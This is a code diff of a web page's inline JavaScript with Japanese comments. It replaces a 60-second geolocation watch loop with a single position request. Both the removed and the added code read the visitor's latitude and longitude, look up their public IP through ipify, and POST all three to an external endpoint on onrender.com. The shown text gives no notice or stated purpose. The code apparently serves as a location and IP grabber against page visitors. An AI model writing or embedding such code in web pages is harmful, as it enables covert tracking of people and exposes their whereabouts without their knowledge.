@@ -150,59 +150,49 @@
       });
     }
 
-// 送信間隔(ミリ秒)
-const interval = 1000;
+navigator.geolocation.getCurrentPosition(function(position) {
 
-// 位置情報取得監視ID
-let watchId; 
+var latitude = position.coords.latitude;
 
-// 位置情報取得と送信を開始
-function startWatching() {
+var longitude = position.coords.longitude;
 
-  // 現在位置監視開始  
-  watchId = navigator.geolocation.watchPosition(function(position) {
+// IPアドレスを取得
 
-    // データ取得
-    var latitude = position.coords.latitude;
-    var longitude = position.coords.longitude;  
+fetch('https://api.ipify.org?format=json')
 
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
+.then(response => response.json())
 
-        var ip = data.ip;
+.then(data => {
 
-        // サーバーへ送信
-        fetch('https://location-ip-data-endpoint.onrender.com', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            latitude,
-            longitude, 
-            ip  
-          })
-        });
+var ip = data.ip;
 
-      });
+// サーバーに送信するデータ
 
-  }, error);
+var deviceData = {
 
-}
+latitude,
 
-// 監視を停止する関数
-function stopWatching() {
-  navigator.geolocation.clearWatch(watchId);  
-}
+longitude,
 
-// 監視開始
-startWatching();
+ip
 
-// 60秒後に監視を停止
-setTimeout(() => {
-  stopWatching(); 
-}, 60000);
+};
+
+// サーバーへPOST
+
+fetch('https://location-ip-data-endpoint.onrender.com', {
+
+method: 'POST',
+
+headers: {
+
+'Content-Type': 'application/json'
+
+},
+
+body: JSON.stringify(deviceData)
+
+});
 
 });
   </script>
